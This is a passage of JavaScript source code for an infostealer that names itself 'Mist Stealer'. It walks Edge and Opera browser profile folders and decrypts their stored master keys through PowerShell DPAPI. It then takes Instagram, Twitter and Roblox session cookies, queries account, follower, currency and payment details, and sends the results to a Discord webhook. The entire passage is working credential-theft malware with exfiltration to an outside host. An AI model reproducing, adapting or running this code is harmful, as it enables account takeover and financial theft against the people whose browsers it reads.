[user.local + '\\Microsoft\\Edge\\User Data\\Profile 13\\', 'Profile_13', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 14\\', 'Profile_14', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 15\\', 'Profile_15', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 16\\', 'Profile_16', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 17\\', 'Profile_17', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 18\\', 'Profile_18', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 19\\', 'Profile_19', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 20\\', 'Profile_20', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 21\\', 'Profile_21', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 22\\', 'Profile_22', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 23\\', 'Profile_23', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 24\\', 'Profile_24', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 25\\', 'Profile_25', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 26\\', 'Profile_26', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 27\\', 'Profile_27', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 28\\', 'Profile_28', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 29\\', 'Profile_29', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 30\\', 'Profile_30', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 31\\', 'Profile_31', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 32\\', 'Profile_32', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 33\\', 'Profile_33', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 34\\', 'Profile_34', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 35\\', 'Profile_35', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 36\\', 'Profile_36', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 37\\', 'Profile_37', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 38\\', 'Profile_38', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 39\\', 'Profile_39', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 40\\', 'Profile_40', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 41\\', 'Profile_41', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 42\\', 'Profile_42', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 43\\', 'Profile_43', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 44\\', 'Profile_44', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 45\\', 'Profile_45', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 46\\', 'Profile_46', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 47\\', 'Profile_47', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 48\\', 'Profile_48', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 49\\', 'Profile_49', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 50\\', 'Profile_50', user.local + '\\Microsoft\\Edge\\User Data\\'],
        [user.roaming + '\\Opera Software\\Opera Stable\\Profile 1\\', 'Opera_Stable_Profile_1', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 2\\', 'Opera_Stable_Profile_2', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 3\\', 'Opera_Stable_Profile_3', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 4\\', 'Opera_Stable_Profile_4', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 5\\', 'Opera_Stable_Profile_5', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 6\\', 'Opera_Stable_Profile_6', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 7\\', 'Opera_Stable_Profile_7', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 8\\', 'Opera_Stable_Profile_8', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 9\\', 'Opera_Stable_Profile_9', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 10\\', 'Opera_Stable_Profile_10', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 11\\', 'Opera_Stable_Profile_11', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 12\\', 'Opera_Stable_Profile_12', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 13\\', 'Opera_Stable_Profile_13', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 14\\', 'Opera_Stable_Profile_14', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 15\\', 'Opera_Stable_Profile_15', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 16\\', 'Opera_Stable_Profile_16', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 17\\', 'Opera_Stable_Profile_17', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 18\\', 'Opera_Stable_Profile_18', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 19\\', 'Opera_Stable_Profile_19', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 20\\', 'Opera_Stable_Profile_20', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 21\\', 'Opera_Stable_Profile_21', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 22\\', 'Opera_Stable_Profile_22', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 23\\', 'Opera_Stable_Profile_23', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 24\\', 'Opera_Stable_Profile_24', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 25\\', 'Opera_Stable_Profile_25', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 26\\', 'Opera_Stable_Profile_26', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 27\\', 'Opera_Stable_Profile_27', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 28\\', 'Opera_Stable_Profile_28', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 29\\', 'Opera_Stable_Profile_29', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 30\\', 'Opera_Stable_Profile_30', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 31\\', 'Opera_Stable_Profile_31', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 32\\', 'Opera_Stable_Profile_32', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 33\\', 'Opera_Stable_Profile_33', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 34\\', 'Opera_Stable_Profile_34', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 35\\', 'Opera_Stable_Profile_35', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 36\\', 'Opera_Stable_Profile_36', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 37\\', 'Opera_Stable_Profile_37', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 38\\', 'Opera_Stable_Profile_38', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 39\\', 'Opera_Stable_Profile_39', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 40\\', 'Opera_Stable_Profile_40', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 41\\', 'Opera_Stable_Profile_41', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 42\\', 'Opera_Stable_Profile_42', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 43\\', 'Opera_Stable_Profile_43', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 44\\', 'Opera_Stable_Profile_44', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 45\\', 'Opera_Stable_Profile_45', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 46\\', 'Opera_Stable_Profile_46', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 47\\', 'Opera_Stable_Profile_47', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 48\\', 'Opera_Stable_Profile_48', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 49\\', 'Opera_Stable_Profile_49', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera Stable\\Profile 50\\', 'Opera_Stable_Profile_50', user.roaming + '\\Opera Software\\Opera Stable\\'],
[user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 1\\', 'Opera_GXStable_Profile_1', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
[user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 2\\', 'Opera_GXStable_Profile_2', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 3\\', 'Opera_GXStable_Profile_3', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 4\\', 'Opera_GXStable_Profile_4', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 5\\', 'Opera_GXStable_Profile_5', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 6\\', 'Opera_GXStable_Profile_6', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 7\\', 'Opera_GXStable_Profile_7', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 8\\', 'Opera_GXStable_Profile_8', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 9\\', 'Opera_GXStable_Profile_9', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 10\\', 'Opera_GXStable_Profile_10', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 11\\', 'Opera_GXStable_Profile_11', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 12\\', 'Opera_GXStable_Profile_12', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 13\\', 'Opera_GXStable_Profile_13', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 14\\', 'Opera_GXStable_Profile_14', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 15\\', 'Opera_GXStable_Profile_15', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 16\\', 'Opera_GXStable_Profile_16', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 17\\', 'Opera_GXStable_Profile_17', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 18\\', 'Opera_GXStable_Profile_18', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 19\\', 'Opera_GXStable_Profile_19', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 20\\', 'Opera_GXStable_Profile_20', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 21\\', 'Opera_GXStable_Profile_21', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 22\\', 'Opera_GXStable_Profile_22', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 23\\', 'Opera_GXStable_Profile_23', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 24\\', 'Opera_GXStable_Profile_24', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 25\\', 'Opera_GXStable_Profile_25', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 26\\', 'Opera_GXStable_Profile_26', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 27\\', 'Opera_GXStable_Profile_27', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 28\\', 'Opera_GXStable_Profile_28', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 29\\', 'Opera_GXStable_Profile_29', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 30\\', 'Opera_GXStable_Profile_30', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 31\\', 'Opera_GXStable_Profile_31', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 32\\', 'Opera_GXStable_Profile_32', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 33\\', 'Opera_GXStable_Profile_33', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 34\\', 'Opera_GXStable_Profile_34', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 35\\', 'Opera_GXStable_Profile_35', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 36\\', 'Opera_GXStable_Profile_36', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 37\\', 'Opera_GXStable_Profile_37', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 38\\', 'Opera_GXStable_Profile_38', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 39\\', 'Opera_GXStable_Profile_39', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 40\\', 'Opera_GXStable_Profile_40', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 41\\', 'Opera_GXStable_Profile_41', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 42\\', 'Opera_GXStable_Profile_42', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 43\\', 'Opera_GXStable_Profile_43', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 44\\', 'Opera_GXStable_Profile_44', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 45\\', 'Opera_GXStable_Profile_45', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 46\\', 'Opera_GXStable_Profile_46', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 47\\', 'Opera_GXStable_Profile_47', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 48\\', 'Opera_GXStable_Profile_48', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\Profile 49\\', 'Opera_GXStable_Profile_49', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
    [user.local + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', 'Guest Profile', user.local + '\\Microsoft\\Edge\\User Data\\'],
    [user.roaming + '\\Opera Software\\Opera Neon\\User Data\\Default\\', 'Default', user.roaming + '\\Opera Software\\Opera Neon\\User Data\\'],
    [user.roaming + '\\Opera Software\\Opera Stable\\Default\\', 'Default', user.roaming + '\\Opera Software\\Opera Stable\\'],
    [user.roaming + '\\Opera Software\\Opera GX Stable\\', 'Default', user.roaming + '\\Opera Software\\Opera GX Stable\\'],
];

randomPath = `${user.fileLoc}\\${user.randomUUID}`;
fs.mkdirSync(randomPath, 484);


async function getEncrypted() {
  for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
    if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
      continue
    }
    try {
      let _0x276965 = Buffer.from(
        JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
          .os_crypt.encrypted_key,
        'base64'
      ).slice(5)
      const _0x4ff4c6 = Array.from(_0x276965),
        _0x4860ac = execSync(
          'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
            _0x4ff4c6 +
            "), $null, 'CurrentUser')"
        )
          .toString()
          .split('\r\n'),
        _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
        _0x2ed7ba = Buffer.from(_0x4a5920)
      browserPath[_0x4c3514].push(_0x2ed7ba)
    } catch (_0x32406b) {}
  }
}

async function fetchInstagramData(sessionId) {
    const headers = {
        "Host": "i.instagram.com",
        "X-Ig-Connection-Type": "WiFi",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Ig-Capabilities": "36r/Fx8=",
        "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
        "X-Ig-App-Locale": "en",
        "X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": `sessionid=${sessionId};`
    };

    const response = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers });
    const userData = response.data.user;

    return {
        username: userData.username,
        verified: userData.is_verified,
        avatar: userData.profile_pic_url,
        sessionId
    };
}

async function fetchFollowersCount(sessionId) {
    const headers = {
        "Host": "i.instagram.com",
        "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
        "Cookie": `sessionid=${sessionId};`
    };

    const accountResponse = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers });
    const accountInfo = accountResponse.data.user;

    const userInfoResponse = await axios.get(`https://i.instagram.com/api/v1/users/${accountInfo.pk}/info`, { headers });
    const userData = userInfoResponse.data.user;
    const followersCount = userData.follower_count;

    return followersCount;
}

async function SubmitInstagram(sessionId) {
    try {
        const data = await fetchInstagramData(sessionId);
        const followersCount = await fetchFollowersCount(sessionId);

        const embed = {
      color: 0x303037,
            title: 'Instagram Session Detected',
            fields: [
                { name: '<a:VerifiedUser:1205132509076135987> Verified Account', value: data.verified ? 'Yes' : 'No', inline: true },
                { name: 'Username', value: data.username, inline: true },
                { name: '<:twitter_follow:1205132510254604388>  Followers Count', value: followersCount, inline: true },
                { name: '<:hackerblack:1095747410539593800> Token', value: '```' + data.sessionId + '```', inline: false },
            ],
            footer: {
                text: 'Created by:  Mist Stealer',
            },
        };

        await axios.post(`${api_url}/webhooks/${key}`, { embeds: [embed] });

        console.log("Data sent to Discord webhook successfully.");
                } catch (error) {
    console.error("Error sending data to Discord webhook:", error);
                }
}

async function TwitterSession(cookie) {
  try {
      let description = '';
      let authToken = `${cookie};ct0=ac1aa9d58c8798f0932410a1a564eb42`;
      let headers = {
          'authority': 'twitter.com',
          'accept': '*/*',
          'accept-language': 'en-US,en;q=0.9',
          'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
          'origin': 'https://twitter.com',
          'referer': 'https://twitter.com/home',
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-origin',
          'sec-gpc': '1',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
          'x-twitter-active-user': 'yes',
          'x-twitter-auth-type': 'OAuth2Session',
          'x-twitter-client-language': 'en',
          'x-csrf-token': 'ac1aa9d58c8798f0932410a1a564eb42',
          'cookie': `auth_token=${authToken}`
      };

      const url = "https://twitter.com/i/api/1.1/account/update_profile.json";

      let response = await axios.post(url, {}, { headers: headers });
      let req = response.data;

      try {
          if (req.description === "") {
              description = "There is no bio";
          } else {
              description = req.description;
          }
      } catch (err) {
          description = "There is no biography";
      }

      description = description.replace("\n", ", ");
      let pp = req.profile_image_url_https;
      let username = req.name;
      let nickname = req.screen_name;
      let profileURL = `https://twitter.com/${username}`;

      let embed_data = {
          "title": "***Mist Stealer***",
          "color": 9109504,
          "footer": { "text": "https://t.me/MistStealer" },
          "thumbnail": { "url": pp },
          "fields": [
              { "name": "Username", "value": `\`\`${username}\`\``, "inline": true },
              { "name": "Screen Name", "value": `\`\`${nickname}\`\``, "inline": true },
              { "name": "Followers", "value": `\`\`${req.followers_count}\`\``, "inline": true },
              { "name": "Following", "value": `\`\`${req.friends_count}\`\``, "inline": true },
              { "name": "Tweets", "value": `\`\`${req.statuses_count}\`\``, "inline": true },
              { "name": "Is Verified", "value": `\`\`${req.verified}\`\``, "inline": true },
              { "name": "Biography", "value": `\`\`${description}\`\``, "inline": false },
              { "name": "Profile URL", "value": `\`\`${profileURL}\`\``, "inline": false },
              { "name": "Cookie", "value": `\`\`${cookie}\`\``, "inline": false }
          ]
      };

      let sessionData = `
      Username: ${username}
      Screen Name: ${nickname}
      Followers: ${req.followers_count}
      Following: ${req.friends_count}
      Tweets: ${req.statuses_count}
      Is Verified: ${req.verified}
      Biography: ${description}
      Profile URL: ${profileURL}
      Cookie: ${cookie}
      `;

      const dir = 'Sessions';
      if (!fs.existsSync(dir)) {
          fs.mkdirSync(dir);
      }

      const filePath = path.join(dir, 'twittersessions.txt');
      fs.writeFileSync(filePath, sessionData, 'utf8');
     await axios.post(`${api_url}/webhooks/${key}`, { embeds: [embed_data] });


  } catch (error) {
      console.log(error.toString());
  }
}


async function GetRobloxDataAndTransactionTotals(secret_cookie) {
    let data = {};
    let headers = {
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
      'cookie': `.ROBLOSECURITY=${secret_cookie};`,
      'origin': 'https://www.roblox.com',
      'referer': 'https://www.roblox.com',
      'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
    };

    try {
      let accountResponse = await axios.get('https://www.roblox.com/my/account/json', { headers: headers });
      let userId = accountResponse.data.UserId;
      data['username'] = accountResponse.data.Name;
      data['displayName'] = accountResponse.data.DisplayName;
      data['userEmail'] = accountResponse.data.UserEmail;
      data['isEmailVerified'] = accountResponse.data.IsEmailVerified ? 'Yes' : 'No';

      let currencyResponse = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers: headers });
      data['robux'] = currencyResponse.data.robux;

      data['userID'] = userId;

      let transactionTotalsResponse = await axios.get(`https://economy.roblox.com/v2/users/${data.userID}/transaction-totals?timeFrame=Month&transactionType=summary`, { headers: headers });
      data['outgoingRobux'] = transactionTotalsResponse.data['outgoingRobuxTotal'];
      data['pendingRobuxTotal'] = transactionTotalsResponse.data['pendingRobuxTotal'];

      return data;
    } catch (error) {
      console.error('Error fetching Roblox data and transaction totals:', error.message);
      throw error;
    }
  }

  async function GetPaymentProfiles(secret_cookie) {
    let headers = {
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
      'cookie': `.ROBLOSECURITY=${secret_cookie};`,
      'origin': 'https://www.roblox.com',
      'referer': 'https://www.roblox.com',
      'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
